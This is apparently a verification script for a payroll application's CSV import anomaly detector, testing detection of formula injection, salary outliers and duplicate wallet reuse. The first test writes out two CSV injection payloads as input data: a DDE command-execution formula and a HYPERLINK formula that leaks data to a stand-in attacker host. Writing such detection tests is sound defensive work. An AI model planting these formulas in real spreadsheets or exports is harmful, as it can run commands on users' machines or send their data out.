#!/usr/bin/env node
/**
 * Executable verification script for Issue #1200:
 * Csv Import Anomaly & Injection Detection Agent.
 */

import { CsvImportAnomalyDetectionAgent } from '../src/services/csvImportAnomalyDetectionAgent.ts';
import assert from 'node:assert/strict';

async function main() {
  console.log('===============================================================');
  console.log('PAYD: CSV IMPORT ANOMALY & INJECTION DETECTION AGENT (#1200)');
  console.log('===============================================================');

  const agent = new CsvImportAnomalyDetectionAgent({
    maxSalaryThreshold: 50_000,
    enableFormulaInjectionCheck: true,
    enableDuplicateWalletCheck: true,
  });

  // Test 1: True Positive - Formula & Command Injections
  console.log('\n[1/4] Testing True Positive: CSV Formula & Command Injection...');
  const maliciousRows = [
    {
      first_name: '=cmd|\' /C calc\'!A0',
      last_name: 'Doe',
      email: 'john@example.com',
      base_salary: '5000',
    },
    {
      first_name: 'Jane',
      last_name: 'Smith',
      email: '=HYPERLINK("http://attacker.com/leak", "Click")',
      base_salary: '6000',
    },
  ];

  const injectionAnomalies = await agent.evaluateImport({ organizationId: 1, rows: maliciousRows });
  assert.equal(injectionAnomalies.length, 2);
  assert.equal(injectionAnomalies[0].reason, 'formula_injection');
  assert.equal(injectionAnomalies[0].severity, 'critical');
  assert.equal(injectionAnomalies[1].reason, 'formula_injection');
  console.log(`  ✓ Flagged ${injectionAnomalies.length} formula injections as critical anomalies`);

  // Test 2: True Positive - Statistical Salary Outlier & Duplicate Wallets
  console.log('\n[2/4] Testing True Positive: Extreme Salary Outlier & Wallet Sybil...');
  const sharedWallet = 'GBJ7V4JHYC52O2ZNDH6WGB7E6R3YGY6YAM7G7R2EQ6V32J4K47U65C5G';
  const outlierRows = [
    { first_name: 'CEO', last_name: 'Boss', email: 'boss@example.com', base_salary: '150000', wallet_address: sharedWallet },
    { first_name: 'Ghost', last_name: 'Worker', email: 'ghost@example.com', base_salary: '5000', wallet_address: sharedWallet },
  ];

  const outlierAnomalies = await agent.evaluateImport({ organizationId: 1, rows: outlierRows });
  assert.ok(outlierAnomalies.some(a => a.reason === 'salary_anomaly'));
  assert.ok(outlierAnomalies.some(a => a.reason === 'duplicate_wallet_reuse'));
  console.log(`  ✓ Successfully flagged salary outlier and duplicate wallet reuse`);

  // Test 3: True Negative - Clean Normal Payroll CSV
  console.log('\n[3/4] Testing True Negative: Clean Legitimate Payroll CSV...');
  const cleanRows = [
    {
      first_name: 'Alice',
      last_name: 'Smith',
      email: 'alice@company.org',
      position: 'Senior Engineer',
      department: 'Engineering',
      base_salary: '7500',
      base_currency: 'USDC',
      wallet_address: 'GA7N6W5KE3OQ5I3EHQE22T34X4Z74D76V4O5LUS3Z6254GOPL2SVR2V7',
    },
    {
      first_name: 'Bob',
      last_name: 'Jones',
      email: 'bob@company.org',
      position: 'Product Designer',
      department: 'Design',
      base_salary: '6500',
      base_currency: 'USDC',
      wallet_address: 'GBJ7V4JHYC52O2ZNDH6WGB7E6R3YGY6YAM7G7R2EQ6V32J4K47U65C5G',
    },
  ];

  const cleanAnomalies = await agent.evaluateImport({ organizationId: 1, rows: cleanRows });
  assert.equal(cleanAnomalies.length, 0);
  console.log('  ✓ No false positives on clean CSV records');

  // Test 4: Configurable Thresholds
  console.log('\n[4/4] Verifying Configurable Thresholds without code changes...');
  const customAgent = new CsvImportAnomalyDetectionAgent({ maxSalaryThreshold: 10_000 });
  const customRows = [{ first_name: 'Carol', last_name: 'Lee', email: 'carol@company.org', base_salary: '12000' }];
  const customAnomalies = await customAgent.evaluateImport({ organizationId: 1, rows: customRows });
  assert.equal(customAnomalies.length, 1);
  assert.equal(customAnomalies[0].reason, 'salary_anomaly');
  console.log('  ✓ Custom threshold (10,000) correctly triggered on 12,000 salary');

  console.log('\n===============================================================');
  console.log('ALL CSV IMPORT ANOMALY DETECTION TESTS PASSED! (#1200)');
  console.log('===============================================================');
}

main().catch((err) => {
  console.error('Verification failed:', err);
  process.exit(1);
});
